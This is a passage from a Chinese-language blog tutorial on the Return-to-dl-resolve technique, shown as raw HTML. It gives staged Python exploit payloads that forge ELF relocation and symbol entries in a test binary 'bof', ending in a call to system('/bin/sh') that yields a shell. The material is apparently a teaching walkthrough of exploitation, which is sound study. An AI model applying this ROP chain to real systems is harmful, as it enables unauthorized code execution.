class="keyword">buf2 </span>+= l32(<span class="keyword">addr_plt_start)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(index_offset)</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">base_stage+80)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(len(cmd))</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">80</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="keyword">buf2 </span>+= cmd + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">100</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="symbol">io.writeline</span>(<span class="keyword">buf2)</span><br><span class="line"></span><span class="symbol">io.interact</span>()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459439191206.png" alt="Alt text"></p>
<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>这一次我们控制<code>index_offset</code>，使其指向我们伪造的<code>fake_reloc</code><br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line"><span class="keyword">addr_plt_start </span>= <span class="number">0x8048370</span> <span class="comment"># objdump -d -j.plt bof</span></span><br><span class="line"><span class="keyword">addr_rel_plt </span>  = <span class="number">0x8048318</span> <span class="comment"># objdump -s -j.rel.plt a.out</span></span><br><span class="line">index_offset   = (<span class="keyword">base_stage </span>+ <span class="number">28</span>) - <span class="keyword">addr_rel_plt</span><br><span class="line"></span><span class="keyword">addr_got_write </span>= <span class="number">0x804a020</span></span><br><span class="line">r_info         = <span class="number">0x507</span></span><br><span class="line">fake_reloc     = l32(<span class="keyword">addr_got_write) </span>+ l32(r_info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">buf2 </span>= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">addr_plt_start)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(index_offset)</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'AAAA'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">buf2 </span>+= l32(<span class="keyword">base_stage+80)</span><br><span class="line"></span><span class="keyword">buf2 </span>+= l32(len(cmd))</span><br><span class="line"><span class="keyword">buf2 </span>+= fake_reloc</span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">80</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span><span class="keyword">buf2 </span>+= cmd + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">buf2 </span>+= <span class="string">'A'</span> * (<span class="number">100</span>-len(<span class="keyword">buf2))</span><br><span class="line"></span>io.writeline(<span class="keyword">buf2)</span><br><span class="line"></span>io.interact()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459442727696.png" alt="Alt text"></p>
<h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h5><p>这一次我们伪造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = "/bin/sh"</span><br><span class="line">addr_plt_start = 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   = (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write = 0x804a020</span><br><span class="line">addr_dynsym    = 0x080481d8</span><br><span class="line">addr_dynstr    = 0x08048268</span><br><span class="line">fake_sym       = base_stage + 36</span><br><span class="line">align          = 0x10 - ((fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">fake_sym       = fake_sym + align</span><br><span class="line">index_dynsym   = (fake_sym - addr_dynsym) / 0x10</span><br><span class="line">r_info         = (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     = l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        = 0x54</span><br><span class="line">fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 = 'AAAA'</span><br><span class="line">buf2 += l32(addr_plt_start)</span><br><span class="line">buf2 += l32(index_offset)</span><br><span class="line">buf2 += 'AAAA'</span><br><span class="line">buf2 += l32(1)</span><br><span class="line">buf2 += l32(base_stage+80)</span><br><span class="line">buf2 += l32(len(cmd))</span><br><span class="line">buf2 += fake_reloc</span><br><span class="line">buf2 += 'B' * align</span><br><span class="line">buf2 += fake_sym </span><br><span class="line">buf2 += 'A' * (80-len(buf2))</span><br><span class="line">buf2 += cmd + '\x00'</span><br><span class="line">buf2 += 'A' * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459442523856.png" alt="Alt text"></p>
<h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>这次把<code>st_name</code>指向我们伪造的字符串<code>write</code><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = "/bin/sh"</span><br><span class="line">addr_plt_start = 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   = (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write = 0x804a020</span><br><span class="line">addr_dynsym    = 0x080481d8</span><br><span class="line">addr_dynstr    = 0x08048268</span><br><span class="line">addr_fake_sym  = base_stage + 36</span><br><span class="line">align          = 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  = addr_fake_sym + align</span><br><span class="line">index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10</span><br><span class="line">r_info         = (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     = l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        = (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 = 'AAAA'</span><br><span class="line">buf2 += l32(addr_plt_start)</span><br><span class="line">buf2 += l32(index_offset)</span><br><span class="line">buf2 += 'AAAA'</span><br><span class="line">buf2 += l32(1)</span><br><span class="line">buf2 += l32(base_stage+80)</span><br><span class="line">buf2 += l32(len(cmd))</span><br><span class="line">buf2 += fake_reloc</span><br><span class="line">buf2 += 'B' * align</span><br><span class="line">buf2 += fake_sym</span><br><span class="line">buf2 += "write\x00"</span><br><span class="line">buf2 += 'A' * (80-len(buf2))</span><br><span class="line">buf2 += cmd + '\x00'</span><br><span class="line">buf2 += 'A' * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><img src="/images/Return-to-dl-resolve/1459442264800.png" alt="Alt text"></p>
<h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>替换<code>write</code>为<code>system</code>,并修改<code>system</code>的参数<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = "/bin/sh"</span><br><span class="line">addr_plt_start = 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   = (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write = 0x804a020</span><br><span class="line">addr_dynsym    = 0x080481d8</span><br><span class="line">addr_dynstr    = 0x08048268</span><br><span class="line">addr_fake_sym  = base_stage + 36</span><br><span class="line">align          = 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  = addr_fake_sym + align</span><br><span class="line">index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10</span><br><span class="line">r_info         = (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     = l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        = (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 = 'AAAA'</span><br><span class="line">buf2 += l32(addr_plt_start)</span><br><span class="line">buf2 += l32(index_offset)</span><br><span class="line">buf2 += 'AAAA'</span><br><span class="line">buf2 += l32(base_stage+80)</span><br><span class="line">buf2 += 'aaaa'</span><br><span class="line">buf2 += 'aaaa'</span><br><span class="line">buf2 += fake_reloc</span><br><span class="line">buf2 += 'B' * align</span><br><span class="line">buf2 += fake_sym</span><br><span class="line">buf2 += "system\x00"</span><br><span class="line">buf2 += 'A' * (80-len(buf2))</span><br><span class="line">buf2 += cmd + '\x00'</span><br><span class="line">buf2 += 'A' * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
<p>得到一个<code>shell</code><br><img src="/images/Return-to-dl-resolve/1459442011940.png" alt="Alt text"></p>
<h5 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h5><p>以上只是叙述原理，当然你比较懒的话，这里已经有成熟的工具辅助编写利用脚本<a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py" target="_blank" rel="external">roputils</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>【1】<a href="https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=elf/elf.h" target="_blank" rel="external">ELF文件格式</a><br>【2】<a href="http://www.xfocus.net/articles/200201/337.html" target="_blank" rel="external">ELF动态解析符号过程</a><br>【3】<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="external">Return to dl-resolve</a><br>【4】<a href="http://inaz2.hatenablog.com/entry/2014/07/15/023406" target="_blank" rel="external">ROP stager + Return-to-dl-resolveによるASLR+DEP回避</a><br>【5】<a href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve" target="_blank" rel="external">Return to dl-resolve</a><br>【6】<a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="external">通过ELF动态装载机制进行漏洞利用</a></p>

      
    </div>
    
  </div>
  
    
  
</article>


<div class="share">
	<!-- JiaThis Button BEGIN -->
	<div class="jiathis_style">
		<span class="jiathis_txt">分享到：</span>
		<a class="jiathis_button_tsina"></a>
		<a class="jiathis_button_cqq"></a>
		<a class="jiathis_button_douban"></a>
		<a class="jiathis_button_weixin"></a>
		<a class="jiathis_button_tumblr"></a>
		<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
	</div>
	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
	<!-- JiaThis Button END -->
</div>



<div class="duoshuo">
	<!-- 多说评论框 start -->
	<div class="ds-thread" data-thread-key="undefined" data-title="" data-url="http://bigtang.org/images/Return-to-dl-resolve/通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）.html"></div>
	<!-- 多说评论框 end -->
	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
	<script type="text/javascript">
	var duoshuoQuery = {short_name:"true"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
	<!-- 多说公共JS代码 end -->
</div>




</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 b1gtang
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>